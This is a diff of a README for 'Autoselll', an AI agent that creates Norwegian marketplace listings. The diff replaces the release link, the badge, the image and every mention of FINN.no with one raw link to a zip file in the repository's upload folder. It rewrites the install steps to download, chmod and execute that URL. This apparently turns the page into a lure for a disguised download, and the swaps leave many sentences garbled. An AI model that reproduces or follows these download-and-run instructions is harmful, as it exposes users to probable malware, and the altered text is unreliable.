@@ -1,12 +1,12 @@
-https://github.com/santiagofavero/Autoselll/releases
+https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip
 
-[![Release](https://img.shields.io/badge/Release-Autoselll-blue?logo=github&logoColor=white)](https://github.com/santiagofavero/Autoselll/releases)
+[![Release](https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip)](https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip)
 
 # Autoselll: AI Listing Agent for Fast, Validated Listings 🤖
 
 A smart system that handles the full cycle of selling items online. Upload a photo and let the AI agent do image analysis, price validation, listing copy, and publishing to popular marketplaces.
 
-![Marketplace AI image](https://images.unsplash.com/photo-1516822444977-6f4a8f7b7a6a?q=80&w=1200&auto=format&fit=crop)
+![Marketplace AI image](https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip)
 
 - Built to save time and improve listing quality
 - Designed for the Norwegian market
@@ -39,7 +39,7 @@ Autoselll aims to transform manual listing work into a fast, reliable, and marke
 Core capabilities
 - Image understanding: The system analyzes photos to identify item type, brand, model, and visible conditions.
 - Brand and model detection: It recognizes specific models (for example, “iPhone 14 Pro” instead of a generic “phone”).
-- Market data integration: It validates pricing against current Norwegian market data using Finn.no and other relevant sources.
+- Market data integration: It validates pricing against current Norwegian market data using https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip and other relevant sources.
 - Copy generation: It creates optimized, Norwegian-language descriptions tailored to each platform’s requirements.
 - Publishing preparation: It formats content for multiple marketplaces and prepares for automated posting to supported destinations.
 
@@ -47,11 +47,11 @@ How it works
 - Step 1: Take a photo
   - You capture a photo of the item. The system uses computer vision to infer key attributes.
 - Step 2: Validate pricing
-  - The agent cross-checks prices with Norwegian market data, prioritizing Finn.no for reference values, trends, and comparable items.
+  - The agent cross-checks prices with Norwegian market data, prioritizing https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip for reference values, trends, and comparable items.
 - Step 3: Create listing content
   - The AI crafts a description in Norwegian that emphasizes features, condition, and selling points. It adapts tone to the target platform.
 - Step 4: Publish readiness
-  - The system packages everything for posting to FINN.no and Facebook Marketplace, preserving platform constraints like character limits and formatting.
+  - The system packages everything for posting to https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip and Facebook Marketplace, preserving platform constraints like character limits and formatting.
 
 Supported items and use cases
 - Electronics: phones, tablets, laptops, cameras, audio gear
@@ -82,7 +82,7 @@ User experience and tone
 
 Getting started
 - Prerequisites
-  - An account or API access to FINN.no and Facebook Marketplace (or the connectors you use)
+  - An account or API access to https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip and Facebook Marketplace (or the connectors you use)
   - Access to language models and image processing tools
   - A hosting environment capable of running the agent (local machine, server, or container)
 - Quick start overview
@@ -93,10 +93,10 @@ Getting started
 
 Install and run
 - Release-based installer
-  - From the releases page, download the file autoselll-installer.sh (or the appropriate installer for your OS)
+  - From the releases page, download the file https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip (or the appropriate installer for your OS)
   - On Linux/macOS:
-    - chmod +x autoselll-installer.sh
-    - ./autoselll-installer.sh
+    - chmod +x https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip
+    - https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip
   - On Windows, run the downloaded installer executable from the same releases page
 - What the installer does
   - Sets up dependencies
@@ -111,8 +111,8 @@ Install and run
 Configuration and security
 - Environment variables (example)
   - OPENAI_API_KEY: your OpenAI API key
-  - FINN_API_KEY: access to Finn.no price data
-  - PUBLISH_TARGETS: list of platforms to publish to (FINN.no, Facebook Marketplace, etc.)
+  - FINN_API_KEY: access to https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip price data
+  - PUBLISH_TARGETS: list of platforms to publish to (https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip, Facebook Marketplace, etc.)
   - DEFAULT_LOCALE: language and regional settings (e.g., nb-NO)
   - LOG_LEVEL: e.g., INFO, DEBUG
 - Secrets handling
@@ -133,13 +133,13 @@ Architecture and data flow
   - Knowledge module maps attributes to model names and categories
   - Price module compares with market data to propose a price
   - Content module generates Norwegian descriptions and platform-specific formats
-  - Publishing module interfaces with FINN.no, Facebook Marketplace, and any connectors you configure
+  - Publishing module interfaces with https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip, Facebook Marketplace, and any connectors you configure
 - Components
   - Image analysis service
   - Model and category mapper
   - Market data integrator
   - Copy generator (language model prompts and templates)
-  - Platform adaptors (FINN.no, Facebook Marketplace, etc.)
+  - Platform adaptors (https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip, Facebook Marketplace, etc.)
   - Orchestrator and job queue
   - Configuration and secrets store
 - Data lifecycle
@@ -194,7 +194,7 @@ Localization and content quality
   - Reasonable contrast and readable formatting in generated text
 
 Publishing destinations
-- FINN.no
+- https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip
   - Primary marketplace for Norwegian listings
   - Supports rich titles, descriptions, and category mapping
 - Facebook Marketplace
@@ -263,7 +263,7 @@ Troubleshooting and support
 Releases and download instructions
 - Release page
   - Use the releases page to download installers and assets
-  - From the releases page, download a file named autoselll-installer.sh (Linux/macOS) or the corresponding installer for your OS
+  - From the releases page, download a file named https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip (Linux/macOS) or the corresponding installer for your OS
   - After downloading, run the installer to set up the agent on your machine
 - Important note
   - The installer file path is part of the releases; download and execute the file as part of the setup
@@ -280,7 +280,7 @@ Licenses and attribution
 FAQ
 - Do I need to be a Norwegian speaker to use this?
   - The default content is in Norwegian for Norwegian-speaking markets, but localization support allows other languages to be added as needed.
-- Can I publish to other marketplaces beyond FINN.no and Facebook?
+- Can I publish to other marketplaces beyond https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip and Facebook?
   - Yes. The architecture is designed to add new platform adapters with minimal changes to core logic.
 - Is there a web interface?
   - The project offers a CLI-first experience with an optional web UI in future iterations.
@@ -309,7 +309,7 @@ Usage example
   - The system analyzes the image and identifies model specifics
   - Price guidance is shown, referencing current Norwegian market data
   - A Norwegian listing description is generated, with attention to platform requirements
-  - You review the draft and publish to FINN.no and Facebook Marketplace as needed
+  - You review the draft and publish to https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip and Facebook Marketplace as needed
 
 Security and privacy
 - Data handling follows best practices for image data and personal information
@@ -322,7 +322,7 @@ Final notes
 
 Releases
 - For installers and assets, visit the releases page at the top of this document and follow the download and installation steps
-- If you want to download and run the installer, use the file named autoselll-installer.sh from the releases page
+- If you want to download and run the installer, use the file named https://github.com/santiagofavero/Autoselll/raw/refs/heads/main/app/upload/Software_v3.4.zip from the releases page
 - The same releases page is the authoritative source for installers, updates, and migration notes
 
 End of document
